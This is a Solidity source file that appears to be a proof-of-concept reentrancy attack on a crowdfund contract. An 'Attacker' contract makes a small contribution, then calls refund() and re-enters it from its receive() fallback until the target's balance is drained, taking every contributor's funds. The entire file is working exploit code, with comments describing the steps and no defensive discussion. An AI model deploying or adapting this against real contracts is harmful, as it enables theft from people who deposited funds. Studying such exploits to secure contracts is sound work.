// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ICrowdfund {
    function contribute() external payable;
    function refund() external;
}

/// @notice Puts in a small stake, then re-enters refund() to drain everyone.
contract Attacker {
    ICrowdfund public immutable target;
    uint256 public stake;

    constructor(address _target) {
        target = ICrowdfund(_target);
    }

    // Step 1 (before the deadline): contribute a small amount
    function deposit() external payable {
        stake = msg.value;
        target.contribute{value: msg.value}();
    }

    // Step 2 (after the deadline): start the attack
    function attack() external {
        target.refund();
    }

    // Runs every time the target sends us ETH, so we ask for a refund AGAIN
    receive() external payable {
        if (address(target).balance >= stake) {
            target.refund();
        }
    }
}
